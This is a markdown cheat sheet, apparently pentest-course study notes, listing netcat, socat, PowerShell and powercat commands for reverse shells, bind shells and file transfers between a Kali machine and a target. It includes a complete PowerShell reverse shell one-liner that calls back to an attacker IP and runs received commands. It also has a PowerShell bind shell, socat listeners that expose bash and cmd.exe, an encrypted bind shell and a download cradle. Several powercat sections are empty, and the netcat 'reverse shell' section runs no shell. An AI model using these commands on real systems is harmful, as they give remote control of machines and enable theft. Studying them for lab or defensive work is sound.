## Netcat
*These commands assume that the `nc` or `nc.exe` binary is installed on both Kali and target machines*

### Netcat Reverse Shell
1. Listen on Kali machine: 
```bash
nc -nvlp $PORT
```

2. Connect from target machine: 
```bash
nc -nv $KALI_IP $PORT
```

### Netcat File Transfers
1. Listen for file on target machine:
```bash
nc -nvlp $PORT > $FILENAME
```

2. Send file from Kali machine:
```bash
nc -nv $TARGET_IP $PORT /path/to/file
```

## Socat
*These commands assume that the `socat` or `socat.exe` binary is installed on both Kali and target machines*
### Socat File Transfers
1. Set Listener with file on Kali Machine:
```bash
sudo socat TCP4-LISTEN:$PORT,fork file:$FILENAME
```

2. Connect to Kali machine from target machine to download file:
```bash
socat TCP:$IP:$PORT file:$FILENAME,create
```

### Socat Reverse Shells
1. Set listener on target machine (**Linux**):
```bash
socat -d -d TCP4-LISTEN:$PORT EXEC:/bin/bash
```
**OR** 

Set listener on target machine (**Windows**)
```bash
socat -d -d TCP4-LISTEN:$PORT EXEC:'cmd.exe',pipes
```

3. Connect to listener from Kali machine:
```bash
socat TCP4:$TARGET_IP:$PORT EXEC:SHELL

## SHELL can be /bin/bash, /bin/zsh, or cmd?
```

### Socat Encrypted Bind Shells
1. Create encryption certificate and private key on Kali machine:
```bash
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
```
2. Create `.pem` file on Kali machine:
```bash
cat bind_shell.key bind_shell.crt > bind_shell.pem
```
3. Create shell on target machine (**Windows**):
```bash
socat -d -d TCP4-LISTEN:$PORT EXEC:'cmd.exe',pipes
```
**OR** 

Create shell on target machine (**Linux**):
```bash
socat -d -d TCP4-LISTEN:$PORT EXEC:/bin/bash
```

4. Connect to target machine:
```bash
socat - OPENSSL:$TARGET_IP:$PORT,verify=0
```

## Powershell

### Powershell File Transfers
Transfer file from **target** to **Kali** machine: 

1. Setup webserver on Kali machine:
```bash
python3 -m http.server 80
```

2. Grab download from target:
```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
```
*NOTE: Change the `http://10.11.0.4/wget.exe` parameter with desired IP address of the **Kali machine** and the destination parameter `C:\Users\offsec\Desktop\wget.exe` with desired destination*


### Powershell Reverse Shells
Reverse Shell from **target** to **Kali** machine:
1. Setup listener on Kali Machine: 
```bash
sudo nc -nvlp $PORT
```

2. Run PowerShell code on target machine:
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
*NOTE: Change the `10.11.0.4` and `443` parameters with desired IP address and port of the **Kali machine** and **listening port***

### PowerShell Bind Shells
1. Setup powershell listener on target on port **443**. Feel free to change port

```powershell
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```
2. Connect to target machine from Kali machine:
```bash
nc -nv $TARGET_IP $PORT
```
### Powercat installation
Install `powercat` on Kali machine:
```bash
sudo apt install powercat
```
Powercat is located in `usr/share/windows-resources/powercat`

Transfer `powercat` to target machine using methods found [here]()

## Powercat File Transfers
```bash

```

### Powercat Bind Shells
Import `powercat` in powershell:
```powershell
import-module .\powercat.ps1
```

### Powercat Reverse Shells

### Powercat 
